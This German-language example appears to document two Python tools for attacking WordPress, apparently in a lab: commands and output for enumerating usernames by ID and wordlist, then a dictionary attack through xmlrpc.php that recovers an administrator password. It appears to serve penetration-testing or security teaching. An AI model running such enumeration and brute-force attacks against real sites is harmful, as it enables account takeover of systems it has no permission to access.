## Example
Findet user mibi per ID und user webadmin per liste. 
### Username Enum

* ` ./user_enum_wp.py --url http://wordpress -u ../wordlists/usernames.lst`

```
| Start User Enum Script
[#] Enumartion via User ID from 1 to 100
[#] Enumartion via Login with 79 Usernames
| Valide Usernames: ['mibi', 'webadmin']
| End
```

### Wörterbuch Angriff
* ` ./brute_force_wp.py --url http://wordpress -U webadmin mibi -p ../password_collector/wordlist_374.lst -m x`

```
| Start Brute Force Script
[?] Load 2 Usernames and 374 Passwords
[#] Use Methode: xmlrpc.php
Username: webadmin - Progress: [278/374]  H@ckingPython! <= Valide - is Administrator

Username:     mibi - Progress: [374/374]   nostrumM@gnam

| Findings:
webadmin : H@ckingPython! - is Administrator

| End
```
